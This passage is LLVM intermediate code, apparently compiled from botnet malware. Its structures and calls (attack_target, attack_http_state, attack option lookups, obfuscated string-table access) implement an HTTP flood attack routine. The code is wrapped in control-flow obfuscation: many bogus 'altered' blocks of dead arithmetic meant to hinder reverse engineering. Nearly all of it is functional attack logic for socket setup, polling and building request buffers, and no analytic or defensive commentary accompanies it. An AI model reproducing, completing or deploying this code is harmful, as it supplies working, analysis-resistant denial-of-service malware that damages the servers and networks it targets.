  %4311 = or i1 %4309, %4310
  br i1 %4311, label %originalBBpart2771, label %originalBB769alteredBB

originalBBpart2771:                               ; preds = %originalBB769
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %4
  %4312 = alloca i8, align 1
  %4313 = alloca %struct.attack_target*, align 8
  %4314 = alloca i8, align 1
  %4315 = alloca %struct.attack_option*, align 8
  %4316 = alloca i32, align 4
  %4317 = alloca i32, align 4
  %4318 = alloca i32, align 4
  %4319 = alloca i32, align 4
  %4320 = alloca %struct.attack_http_state*, align 8
  %4321 = alloca i8*, align 8
  %4322 = alloca i8*, align 8
  %4323 = alloca i8*, align 8
  %4324 = alloca i8*, align 8
  %4325 = alloca i32, align 4
  %4326 = alloca i16, align 2
  %4327 = alloca [10241 x i8], align 16
  %4328 = alloca %struct.fd_set, align 8
  %4329 = alloca %struct.fd_set, align 8
  %4330 = alloca i32, align 4
  %4331 = alloca i32, align 4
  %4332 = alloca %struct.timeval, align 8
  %4333 = alloca %struct.attack_http_state*, align 8
  %4334 = alloca i32, align 4
  %4335 = alloca i32, align 4
  %4336 = alloca i32, align 4
  %4337 = alloca i32, align 4
  %4338 = alloca i32, align 4
  %4339 = alloca %struct.sockaddr_in, align 4
  %4340 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %4341 = alloca [10240 x i8], align 16
  %4342 = alloca i32, align 4
  %4343 = alloca i32, align 4
  %4344 = alloca i32, align 4
  %4345 = alloca i32, align 4
  %4346 = alloca i32, align 4
  %4347 = alloca i8*, align 8
  %4348 = alloca i32, align 4
  %4349 = alloca i32, align 4
  %4350 = alloca i8*, align 8
  %4351 = alloca i32, align 4
  %4352 = alloca i32, align 4
  %4353 = alloca i8*, align 8
  %4354 = alloca i32, align 4
  %4355 = alloca i32, align 4
  %4356 = alloca i8*, align 8
  %4357 = alloca i32, align 4
  %4358 = alloca i32, align 4
  %4359 = alloca i32, align 4
  %4360 = alloca i32, align 4
  %4361 = alloca i8*, align 8
  %4362 = alloca i32, align 4
  %4363 = alloca i32, align 4
  %4364 = alloca i8*, align 8
  %4365 = alloca i32, align 4
  %4366 = alloca i32, align 4
  %4367 = alloca i32, align 4
  %4368 = alloca i32, align 4
  %4369 = alloca i32, align 4
  %4370 = alloca i32, align 4
  store i8 %0, i8* %4312, align 1
  store %struct.attack_target* %1, %struct.attack_target** %4313, align 8
  store i8 %2, i8* %4314, align 1
  store %struct.attack_option* %3, %struct.attack_option** %4315, align 8
  store i32 0, i32* %4319, align 4
  store %struct.attack_http_state* null, %struct.attack_http_state** %4320, align 8
  %4371 = load i8, i8* %4314, align 1
  %4372 = load %struct.attack_option*, %struct.attack_option** %4315, align 8
  %4373 = call i8* @attack_get_opt_str(i8 zeroext %4371, %struct.attack_option* %4372, i8 zeroext 21, i8* null)
  store i8* %4373, i8** %4321, align 8
  %4374 = load i8, i8* %4314, align 1
  %4375 = load %struct.attack_option*, %struct.attack_option** %4315, align 8
  %4376 = call i8* @attack_get_opt_str(i8 zeroext %4374, %struct.attack_option* %4375, i8 zeroext 20, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  store i8* %4376, i8** %4322, align 8
  %4377 = load i8, i8* %4314, align 1
  %4378 = load %struct.attack_option*, %struct.attack_option** %4315, align 8
  %4379 = call i8* @attack_get_opt_str(i8 zeroext %4377, %struct.attack_option* %4378, i8 zeroext 8, i8* null)
  store i8* %4379, i8** %4323, align 8
  %4380 = load i8, i8* %4314, align 1
  %4381 = load %struct.attack_option*, %struct.attack_option** %4315, align 8
  %4382 = call i8* @attack_get_opt_str(i8 zeroext %4380, %struct.attack_option* %4381, i8 zeroext 22, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i32 0, i32 0))
  store i8* %4382, i8** %4324, align 8
  %4383 = load i8, i8* %4314, align 1
  %4384 = load %struct.attack_option*, %struct.attack_option** %4315, align 8
  %4385 = call i32 @attack_get_opt_int(i8 zeroext %4383, %struct.attack_option* %4384, i8 zeroext 24, i32 1)
  store i32 %4385, i32* %4325, align 4
  %4386 = load i8, i8* %4314, align 1
  %4387 = load %struct.attack_option*, %struct.attack_option** %4315, align 8
  %4388 = call i32 @attack_get_opt_int(i8 zeroext %4386, %struct.attack_option* %4387, i8 zeroext 7, i32 80)
  %4389 = trunc i32 %4388 to i16
  store i16 %4389, i16* %4326, align 2
  %4390 = bitcast [10241 x i8]* %4327 to i8*
  call void @llvm.memset.p0i8.i64(i8* %4390, i8 0, i64 10241, i32 16, i1 false)
  %4391 = load i8*, i8** %4323, align 8
  %4392 = icmp eq i8* %4391, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %115
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %143
  %4393 = load i8*, i8** %23, align 8
  %4394 = load i32, i32* %18, align 4
  %4395 = sext i32 %4394 to i64
  %4396 = getelementptr inbounds i8, i8* %4393, i64 %4395
  %4397 = load i8, i8* %4396, align 1
  %4398 = sext i8 %4397 to i32
  %4399 = icmp sge i32 %4398, 97
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %184
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %201
  %4400 = load i32, i32* %18, align 4
  %_ = shl i32 %4400, 1
  %_15 = sub i32 %4400, 1
  %gen = mul i32 %_15, 1
  %_16 = sub i32 %4400, 1
  %gen17 = mul i32 %_16, 1
  %_18 = shl i32 %4400, 1
  %_19 = sub i32 %4400, 1
  %gen20 = mul i32 %_19, 1
  %4401 = add nsw i32 %4400, 1
  store i32 %4401, i32* %18, align 4
  br label %originalBB14

originalBB24alteredBB:                            ; preds = %originalBB24, %275
  %4402 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %4403 = load i32, i32* %17, align 4
  %4404 = sext i32 %4403 to i64
  %4405 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4402, i64 %4404
  %4406 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4405, i32 0, i32 6
  %4407 = getelementptr inbounds [257 x i8], [257 x i8]* %4406, i32 0, i32 0
  %4408 = getelementptr inbounds i8, i8* %4407, i64 1
  %4409 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %4410 = load i32, i32* %17, align 4
  %4411 = sext i32 %4410 to i64
  %4412 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4409, i64 %4411
  %4413 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4412, i32 0, i32 6
  %4414 = getelementptr inbounds [257 x i8], [257 x i8]* %4413, i32 0, i32 0
  %4415 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %4416 = load i32, i32* %17, align 4
  %4417 = sext i32 %4416 to i64
  %4418 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4415, i64 %4417
  %4419 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4418, i32 0, i32 6
  %4420 = getelementptr inbounds [257 x i8], [257 x i8]* %4419, i32 0, i32 0
  %4421 = call i32 @util_strlen(i8* %4420)
  %4422 = sext i32 %4421 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %4408, i8* %4414, i64 %4422, i32 1, i1 false)
  %4423 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %4424 = load i32, i32* %17, align 4
  %4425 = sext i32 %4424 to i64
  %4426 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4423, i64 %4425
  %4427 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4426, i32 0, i32 6
  %4428 = getelementptr inbounds [257 x i8], [257 x i8]* %4427, i64 0, i64 0
  store i8 47, i8* %4428, align 4
  br label %originalBB24

originalBB29alteredBB:                            ; preds = %originalBB29, %385
  %4429 = call i32 @rand_next()
  %_30 = sub i32 %4429, 15
  %gen31 = mul i32 %_30, 15
  %_32 = sub i32 %4429, 15
  %gen33 = mul i32 %_32, 15
  %_34 = sub i32 %4429, 15
  %gen35 = mul i32 %_34, 15
  %_36 = shl i32 %4429, 15
  %4430 = urem i32 %4429, 15
  br label %originalBB29

originalBB40alteredBB:                            ; preds = %originalBB40, %422
  call void @table_unlock_val(i8 zeroext 49)
  %4431 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %4432 = load i32, i32* %17, align 4
  %4433 = sext i32 %4432 to i64
  %4434 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4431, i64 %4433
  %4435 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4434, i32 0, i32 5
  %4436 = getelementptr inbounds [512 x i8], [512 x i8]* %4435, i32 0, i32 0
  %4437 = call i8* @table_retrieve_val(i32 49, i32* null)
  %4438 = call i32 @util_strcpy(i8* %4436, i8* %4437)
  call void @table_lock_val(i8 zeroext 49)
  br label %originalBB40

originalBB44alteredBB:                            ; preds = %originalBB44, %447
  call void @table_unlock_val(i8 zeroext 50)
  %4439 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %4440 = load i32, i32* %17, align 4
  %4441 = sext i32 %4440 to i64
  %4442 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4439, i64 %4441
  %4443 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4442, i32 0, i32 5
  %4444 = getelementptr inbounds [512 x i8], [512 x i8]* %4443, i32 0, i32 0
  %4445 = call i8* @table_retrieve_val(i32 50, i32* null)
  %4446 = call i32 @util_strcpy(i8* %4444, i8* %4445)
  call void @table_lock_val(i8 zeroext 50)
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %580
  %4447 = load i32, i32* %17, align 4
  %_49 = sub i32 %4447, 1
  %gen50 = mul i32 %_49, 1
  %4448 = add nsw i32 %4447, 1
  store i32 %4448, i32* %17, align 4
  br label %originalBB48

originalBB54alteredBB:                            ; preds = %originalBB54, %603
  %4449 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %29, i32 0, i32 0
  %4450 = getelementptr inbounds [16 x i64], [16 x i64]* %4449, i64 0, i64 0
  %4451 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %4450) #6, !srcloc !1
  %4452 = extractvalue { i64, i64* } %4451, 0
  %4453 = extractvalue { i64, i64* } %4451, 1
  %4454 = trunc i64 %4452 to i32
  store i32 %4454, i32* %36, align 4
  %4455 = ptrtoint i64* %4453 to i64
  %4456 = trunc i64 %4455 to i32
  store i32 %4456, i32* %37, align 4
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %658
  %4457 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4458 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4457, i32 0, i32 1
  store i8 4, i8* %4458, align 4
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %680
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %703
  %4459 = bitcast %struct.sockaddr_in* %40 to i8*
  call void @llvm.memset.p0i8.i64(i8* %4459, i8 0, i64 16, i32 4, i1 false)
  %4460 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4461 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4460, i32 0, i32 0
  %4462 = load i32, i32* %4461, align 4
  %4463 = icmp ne i32 %4462, -1
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %725
  %4464 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4465 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4464, i32 0, i32 0
  %4466 = load i32, i32* %4465, align 4
  %4467 = call i32 @close(i32 %4466)
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %815
  %4468 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4469 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4468, i32 0, i32 1
  %4470 = load i8, i8* %4469, align 4
  %4471 = zext i8 %4470 to i32
  %4472 = icmp eq i32 %4471, 2
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %874
  %4473 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4474 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4473, i32 0, i32 0
  %4475 = load i32, i32* %4474, align 4
  %_79 = sub i32 0, %4475
  %gen80 = add i32 %_79, 1
  %_81 = shl i32 %4475, 1
  %_82 = sub i32 %4475, 1
  %gen83 = mul i32 %_82, 1
  %4476 = add nsw i32 %4475, 1
  store i32 %4476, i32* %31, align 4
  br label %originalBB78

originalBB87alteredBB:                            ; preds = %originalBB87, %1014
  call void @table_unlock_val(i8 zeroext 35)
  %4477 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4478 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4479 = call i32 @util_strlen(i8* %4478)
  %4480 = sext i32 %4479 to i64
  %4481 = getelementptr inbounds i8, i8* %4477, i64 %4480
  %4482 = call i8* @table_retrieve_val(i32 35, i32* null)
  %4483 = call i32 @util_strcpy(i8* %4481, i8* %4482)
  call void @table_lock_val(i8 zeroext 35)
  %4484 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4485 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4486 = call i32 @util_strlen(i8* %4485)
  %4487 = sext i32 %4486 to i64
  %4488 = getelementptr inbounds i8, i8* %4484, i64 %4487
  %4489 = call i32 @util_strcpy(i8* %4488, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %4490 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4491 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4492 = call i32 @util_strlen(i8* %4491)
  %4493 = sext i32 %4492 to i64
  %4494 = getelementptr inbounds i8, i8* %4490, i64 %4493
  %4495 = call i8* @table_retrieve_val(i32 40, i32* null)
  %4496 = call i32 @util_strcpy(i8* %4494, i8* %4495)
  %4497 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4498 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4499 = call i32 @util_strlen(i8* %4498)
  %4500 = sext i32 %4499 to i64
  %4501 = getelementptr inbounds i8, i8* %4497, i64 %4500
  %4502 = call i32 @util_strcpy(i8* %4501, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %4503 = load i8*, i8** %22, align 8
  %4504 = call i32 @util_strlen(i8* %4503)
  %4505 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4506 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4507 = call i32 @util_strlen(i8* %4506)
  %4508 = sext i32 %4507 to i64
  %4509 = getelementptr inbounds i8, i8* %4505, i64 %4508
  %4510 = call i8* @util_itoa(i32 %4504, i32 10, i8* %4509)
  %4511 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4512 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4513 = call i32 @util_strlen(i8* %4512)
  %4514 = sext i32 %4513 to i64
  %4515 = getelementptr inbounds i8, i8* %4511, i64 %4514
  %4516 = call i32 @util_strcpy(i8* %4515, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %originalBB87

originalBB91alteredBB:                            ; preds = %originalBB91, %1108
  %4517 = load i32, i32* %18, align 4
  %_92 = shl i32 %4517, 1
  %_93 = shl i32 %4517, 1
  %_94 = shl i32 %4517, 1
  %_95 = sub i32 0, %4517
  %gen96 = add i32 %_95, 1
  %_97 = shl i32 %4517, 1
  %_98 = sub i32 0, %4517
  %gen99 = add i32 %_98, 1
  %_100 = sub i32 %4517, 1
  %gen101 = mul i32 %_100, 1
  %_102 = shl i32 %4517, 1
  %4518 = add nsw i32 %4517, 1
  store i32 %4518, i32* %18, align 4
  br label %originalBB91

originalBB106alteredBB:                           ; preds = %originalBB106, %1134
  %4519 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4520 = getelementptr inbounds [10240 x i8], [10240 x i8]* %42, i32 0, i32 0
  %4521 = call i32 @util_strlen(i8* %4520)
  %4522 = sext i32 %4521 to i64
  %4523 = getelementptr inbounds i8, i8* %4519, i64 %4522
  %4524 = call i32 @util_strcpy(i8* %4523, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %4525 = load i8*, i8** %22, align 8
  %4526 = icmp ne i8* %4525, null
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %1167
  %4527 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4528 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4527, i32 0, i32 9
  %4529 = getelementptr inbounds [9 x i8], [9 x i8]* %4528, i32 0, i32 0
  %4530 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4531 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4530, i32 0, i32 10
  %4532 = getelementptr inbounds [9 x i8], [9 x i8]* %4531, i32 0, i32 0
  %4533 = call signext i8 @util_strcmp(i8* %4529, i8* %4532)
  %4534 = icmp ne i8 %4533, 0
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %1234
  %4535 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4536 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4535, i32 0, i32 0
  %4537 = load i32, i32* %4536, align 4
  %_115 = shl i32 %4537, 1
  %_116 = sub i32 0, %4537
  %gen117 = add i32 %_116, 1
  %_118 = shl i32 %4537, 1
  %_119 = sub i32 0, %4537
  %gen120 = add i32 %_119, 1
  %_121 = sub i32 %4537, 1
  %gen122 = mul i32 %_121, 1
  %4538 = add nsw i32 %4537, 1
  store i32 %4538, i32* %31, align 4
  br label %originalBB114

originalBB126alteredBB:                           ; preds = %originalBB126, %1283
  %4539 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4540 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4539, i32 0, i32 0
  %4541 = load i32, i32* %4540, align 4
  %_127 = sub i32 0, %4541
  %gen128 = add i32 %_127, 1
  %_129 = shl i32 %4541, 1
  %_130 = sub i32 0, %4541
  %gen131 = add i32 %_130, 1
  %_132 = sub i32 0, %4541
  %gen133 = add i32 %_132, 1
  %_134 = sub i32 0, %4541
  %gen135 = add i32 %_134, 1
  %_136 = sub i32 %4541, 1
  %gen137 = mul i32 %_136, 1
  %_138 = sub i32 %4541, 1
  %gen139 = mul i32 %_138, 1
  %_140 = shl i32 %4541, 1
  %4542 = add nsw i32 %4541, 1
  store i32 %4542, i32* %31, align 4
  br label %originalBB126

originalBB144alteredBB:                           ; preds = %originalBB144, %1304
  br label %originalBB144

originalBB148alteredBB:                           ; preds = %originalBB148, %1321
  %4543 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4544 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4543, i32 0, i32 1
  %4545 = load i8, i8* %4544, align 4
  %4546 = zext i8 %4545 to i32
  %4547 = icmp eq i32 %4546, 7
  br label %originalBB148

originalBB152alteredBB:                           ; preds = %originalBB152, %1343
  %4548 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4549 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4548, i32 0, i32 0
  %4550 = load i32, i32* %4549, align 4
  %_153 = shl i32 %4550, 64
  %_154 = shl i32 %4550, 64
  %_155 = sub i32 0, %4550
  %gen156 = add i32 %_155, 64
  %_157 = shl i32 %4550, 64
  %4551 = srem i32 %4550, 64
  %4552 = zext i32 %4551 to i64
  %_158 = sub i64 0, 1
  %gen159 = add i64 %_158, %4552
  %_160 = sub i64 1, %4552
  %gen161 = mul i64 %_160, %4552
  %_162 = shl i64 1, %4552
  %_163 = shl i64 1, %4552
  %4553 = shl i64 1, %4552
  %4554 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %29, i32 0, i32 0
  %4555 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4556 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4555, i32 0, i32 0
  %4557 = load i32, i32* %4556, align 4
  %_164 = sub i32 %4557, 64
  %gen165 = mul i32 %_164, 64
  %4558 = sdiv i32 %4557, 64
  %4559 = sext i32 %4558 to i64
  %4560 = getelementptr inbounds [16 x i64], [16 x i64]* %4554, i64 0, i64 %4559
  %4561 = load i64, i64* %4560, align 8
  %_166 = sub i64 %4561, %4553
  %gen167 = mul i64 %_166, %4553
  %_168 = sub i64 0, %4561
  %gen169 = add i64 %_168, %4553
  %_170 = sub i64 %4561, %4553
  %gen171 = mul i64 %_170, %4553
  %_172 = sub i64 0, %4561
  %gen173 = add i64 %_172, %4553
  %4562 = or i64 %4561, %4553
  store i64 %4562, i64* %4560, align 8
  %4563 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4564 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4563, i32 0, i32 0
  %4565 = load i32, i32* %4564, align 4
  %4566 = load i32, i32* %31, align 4
  %4567 = icmp sgt i32 %4565, %4566
  br label %originalBB152

originalBB177alteredBB:                           ; preds = %originalBB177, %1385
  br label %originalBB177

originalBB181alteredBB:                           ; preds = %originalBB181, %1434
  br label %originalBB181

originalBB185alteredBB:                           ; preds = %originalBB185, %1457
  %4568 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4569 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4568, i32 0, i32 1
  store i8 0, i8* %4569, align 4
  %4570 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4571 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4570, i32 0, i32 0
  %4572 = load i32, i32* %4571, align 4
  %4573 = call i32 @close(i32 %4572)
  %4574 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4575 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4574, i32 0, i32 0
  store i32 -1, i32* %4575, align 4
  br label %originalBB185

originalBB189alteredBB:                           ; preds = %originalBB189, %1492
  br label %originalBB189

originalBB193alteredBB:                           ; preds = %originalBB193, %1509
  br label %originalBB193

originalBB197alteredBB:                           ; preds = %originalBB197, %1527
  br label %originalBB197

originalBB201alteredBB:                           ; preds = %originalBB201, %1562
  br label %originalBB201

originalBB205alteredBB:                           ; preds = %originalBB205, %1579
  store i32 0, i32* %17, align 4
  br label %originalBB205

originalBB209alteredBB:                           ; preds = %originalBB209, %1596
  %4576 = load i32, i32* %17, align 4
  %4577 = load i32, i32* %26, align 4
  %4578 = icmp slt i32 %4576, %4577
  br label %originalBB209

originalBB213alteredBB:                           ; preds = %originalBB213, %1651
  %4579 = load i32, i32* %20, align 4
  %4580 = icmp eq i32 %4579, 0
  br label %originalBB213

originalBB217alteredBB:                           ; preds = %originalBB217, %1670
  %4581 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4582 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4581, i32 0, i32 1
  store i8 4, i8* %4582, align 4
  br label %originalBB217

originalBB221alteredBB:                           ; preds = %originalBB221, %1689
  %4583 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4584 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4583, i32 0, i32 0
  %4585 = load i32, i32* %4584, align 4
  %4586 = call i32 @close(i32 %4585)
  %4587 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4588 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4587, i32 0, i32 0
  store i32 -1, i32* %4588, align 4
  %4589 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4590 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4589, i32 0, i32 1
  store i8 0, i8* %4590, align 4
  br label %originalBB221

originalBB225alteredBB:                           ; preds = %originalBB225, %1714
  br label %originalBB225

originalBB229alteredBB:                           ; preds = %originalBB229, %1731
  %4591 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %29, i32 0, i32 0
  %4592 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4593 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4592, i32 0, i32 0
  %4594 = load i32, i32* %4593, align 4
  %_230 = sub i32 %4594, 64
  %gen231 = mul i32 %_230, 64
  %_232 = sub i32 0, %4594
  %gen233 = add i32 %_232, 64
  %_234 = sub i32 %4594, 64
  %gen235 = mul i32 %_234, 64
  %4595 = sdiv i32 %4594, 64
  %4596 = sext i32 %4595 to i64
  %4597 = getelementptr inbounds [16 x i64], [16 x i64]* %4591, i64 0, i64 %4596
  %4598 = load i64, i64* %4597, align 8
  %4599 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4600 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4599, i32 0, i32 0
  %4601 = load i32, i32* %4600, align 4
  %_236 = shl i32 %4601, 64
  %_237 = shl i32 %4601, 64
  %4602 = srem i32 %4601, 64
  %4603 = zext i32 %4602 to i64
  %_238 = sub i64 0, 1
  %gen239 = add i64 %_238, %4603
  %_240 = sub i64 0, 1
  %gen241 = add i64 %_240, %4603
  %_242 = sub i64 0, 1
  %gen243 = add i64 %_242, %4603
  %_244 = sub i64 1, %4603
  %gen245 = mul i64 %_244, %4603
  %4604 = shl i64 1, %4603
  %_246 = sub i64 %4598, %4604
  %gen247 = mul i64 %_246, %4604
  %_248 = sub i64 0, %4598
  %gen249 = add i64 %_248, %4604
  %_250 = shl i64 %4598, %4604
  %_251 = sub i64 0, %4598
  %gen252 = add i64 %_251, %4604
  %4605 = and i64 %4598, %4604
  %4606 = icmp ne i64 %4605, 0
  br label %originalBB229

originalBB257alteredBB:                           ; preds = %originalBB257, %1764
  %4607 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4608 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4607, i32 0, i32 1
  %4609 = load i8, i8* %4608, align 4
  %4610 = zext i8 %4609 to i32
  %4611 = icmp eq i32 %4610, 6
  br label %originalBB257

originalBB261alteredBB:                           ; preds = %originalBB261, %1812
  br label %originalBB261

originalBB265alteredBB:                           ; preds = %originalBB265, %1829
  %4612 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %4613 = load i32, i32* %20, align 4
  %4614 = call i32 @util_memsearch(i8* %4612, i32 %4613, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %4615 = sext i32 %4614 to i64
  %4616 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %4615
  store i8 0, i8* %4616, align 1
  %4617 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %4618 = load i32, i32* %20, align 4
  %4619 = call i8* @table_retrieve_val(i32 46, i32* null)
  %4620 = call i32 @util_stristr(i8* %4617, i32 %4618, i8* %4619)
  %4621 = icmp ne i32 %4620, -1
  br label %originalBB265

originalBB269alteredBB:                           ; preds = %originalBB269, %1856
  %4622 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4623 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4622, i32 0, i32 11
  store i32 2, i32* %4623, align 4
  br label %originalBB269

originalBB273alteredBB:                           ; preds = %originalBB273, %1917
  %4624 = load i32, i32* %46, align 4
  %4625 = sext i32 %4624 to i64
  %4626 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %4625
  store i8* %4626, i8** %48, align 8
  %4627 = load i32, i32* %47, align 4
  %4628 = icmp sge i32 %4627, 2
  br label %originalBB273

originalBB277alteredBB:                           ; preds = %originalBB277, %1942
  %4629 = load i32, i32* %46, align 4
  %4630 = load i32, i32* %47, align 4
  %_278 = sub i32 0, %4629
  %gen279 = add i32 %_278, %4630
  %_280 = sub i32 0, %4629
  %gen281 = add i32 %_280, %4630
  %_282 = sub i32 %4629, %4630
  %gen283 = mul i32 %_282, %4630
  %_284 = sub i32 0, %4629
  %gen285 = add i32 %_284, %4630
  %_286 = shl i32 %4629, %4630
  %_287 = sub i32 0, %4629
  %gen288 = add i32 %_287, %4630
  %_289 = sub i32 0, %4629
  %gen290 = add i32 %_289, %4630
  %4631 = add nsw i32 %4629, %4630
  %4632 = sext i32 %4631 to i64
  %4633 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %4632
  store i8 0, i8* %4633, align 1
  %4634 = load i8*, i8** %48, align 8
  %4635 = load i8*, i8** %48, align 8
  %4636 = call i32 @util_strlen(i8* %4635)
  %4637 = call i8* @table_retrieve_val(i32 43, i32* null)
  %4638 = call i32 @util_stristr(i8* %4634, i32 %4636, i8* %4637)
  %4639 = icmp ne i32 %4638, 0
  br label %originalBB277

originalBB294alteredBB:                           ; preds = %originalBB294, %1973
  br label %originalBB294

originalBB298alteredBB:                           ; preds = %originalBB298, %1991
  %4640 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4641 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4640, i32 0, i32 13
  store i32 0, i32* %4641, align 4
